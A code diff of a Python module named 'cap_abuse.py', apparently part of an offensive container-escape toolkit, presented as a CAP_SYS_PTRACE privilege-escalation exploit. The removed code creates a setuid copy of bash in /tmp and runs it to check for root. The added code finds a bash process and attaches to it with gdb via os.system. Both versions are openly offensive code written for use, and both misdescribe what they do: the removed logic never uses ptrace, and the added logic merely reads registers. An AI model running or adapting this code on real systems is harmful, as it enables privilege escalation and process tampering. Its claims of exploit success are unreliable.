@@ -1,32 +1,31 @@
+# Path: attacks/cap_abuse.py
+
 import os
 import subprocess
 
-def run(container=None, simulate=False):
+def run(container_name, simulate=False):
     print("[*] Running CAP_SYS_PTRACE Abuse Exploit...")
 
     if simulate:
-        print("[SIMULATE] Would attach to a root process and attempt to inject payload or gain SUID shell.")
-        return "Simulated CAP_SYS_PTRACE abuse run."
+        print("[SIMULATE] Would attempt ptrace attach to another process.")
+        return "Simulated CAP_SYS_PTRACE abuse."
 
     try:
-        # Check if CAP_SYS_PTRACE is available
-        with open("/proc/self/status") as f:
-            status = f.read()
-        if "CapEff:\t" not in status or "0000000000000400" not in status:
-            return "Exploit failed: CAP_SYS_PTRACE not available."
+        # Step 1: Find a target process (bash or sleep is commonly used)
+        print("[*] Locating target PID (bash)...")
+        result = subprocess.run(["pidof", "bash"], stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
+        if result.returncode != 0 or not result.stdout.strip():
+            print("[-] Failed to find bash process.")
+            return
+        pid = result.stdout.strip().split()[0]
+        print(f"[+] Found PID: {pid}")
 
-        # Create a setuid root shell
-        suid_shell = "/tmp/pwned_sh"
-        subprocess.run(["cp", "/bin/bash", suid_shell], check=True)
-        subprocess.run(["chmod", "4755", suid_shell], check=True)
+        # Step 2: Attempt to attach using ptrace
+        print(f"[*] Attaching to process {pid} using gdb...")
+        gdb_command = f"gdb -p {pid} -ex 'info registers' -ex 'detach' -ex 'quit'"
+        os.system(gdb_command)
 
-        # Verify the exploit
-        result = subprocess.run([suid_shell, "-p", "-c", "id"], capture_output=True, text=True)
-        if "uid=0" in result.stdout:
-            print("[+] Exploit succeeded. SUID shell created and executed.")
-            return f"Exploit success: {result.stdout.strip()}"
-        else:
-            return "Exploit failed: SUID shell did not elevate privileges."
+        print("[+] Exploit execution finished.")
 
     except Exception as e:
-        return f"Exploit failed: {str(e)}"
+        print(f"[!] Exception occurred: {e}")
